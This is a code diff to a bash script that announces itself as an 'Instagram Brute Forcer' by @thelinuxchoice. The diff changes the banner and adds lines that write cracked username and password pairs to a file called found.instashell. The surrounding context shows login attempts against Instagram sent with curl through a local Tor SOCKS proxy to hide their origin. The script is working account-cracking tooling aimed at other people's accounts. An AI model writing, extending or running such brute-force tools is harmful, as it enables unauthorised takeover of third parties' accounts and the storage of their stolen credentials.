@@ -2,23 +2,24 @@
 # Coded by @thelinuxchoice (Instagram)
 checkroot() {
 if [[ "$(id -u)" -ne 0 ]]; then
-    printf "\e[1;77mPlease, run this program as root\n\e[0m"
+    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
     exit 1
 fi
 }
 
 banner() {
 
-
-printf "\e[35m▪   ▐ ▄ .▄▄ · ▄▄▄▄▄ ▄▄▄· .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  \e[0m\n"
-printf "\e[95m██ •█▌▐█▐█ ▀. •██  ▐█ ▀█ ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  \e[0m\n"
-printf "\e[95m▐█·▐█▐▐▌▄▀▀▀█▄ ▐█.▪▄█▀▀█ ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  \e[0m\n"
-printf "\e[37m▐█▌██▐█▌▐█▄▪▐█ ▐█▌·▐█ ▪▐▌▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌\e[0m\n"
-printf "\e[37m▀▀▀▀▀ █▪ ▀▀▀▀  ▀▀▀  ▀  ▀  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ \e[0m\e[92m▀\e[0m\n"
-printf "\e[41m                          Instagram Brute Forcer >>\e[0m\n"
-
-
+printf "\e[1;92m     _                                   _             _  _           \e[0m\n"
+printf "\e[1;92m _  | |                _                | |           | || |          \e[0m\n"
+printf "\e[1;92m( \ | | ____    ___  _| |_  _____   ___ | |__   _____ | || |          \e[0m\n"
+printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |          \e[0m\n"
+printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
+printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
+printf "\n"
+printf "\e[1;77m\e[45m                     Instagram Brute Forcer. Author: @thelinuxchoice\e[0m\n"
+printf "\n"
 }
+
 banner
 checkroot
 read -p $'\e[1;92mUsername account: \e[0m' user
@@ -72,12 +73,16 @@ check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.
 #echo $check
 if [[ "$check" == "200" ]]; then
 printf "\e[1;92m [*] Password Found: %s \n\e[0m" $pass
+printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
+printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
 exit 1
 fi
 
 if [[ "$check" == "challenge" ]]; then
 printf "\e[1;92m [*] Password Found: %s\n" $pass
 printf "\e[1;92m [*] Challenge required\n"
+printf "Username: %s, Password: %s" $user $pass >> found.instashell
+printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
 exit 1
 fi
 
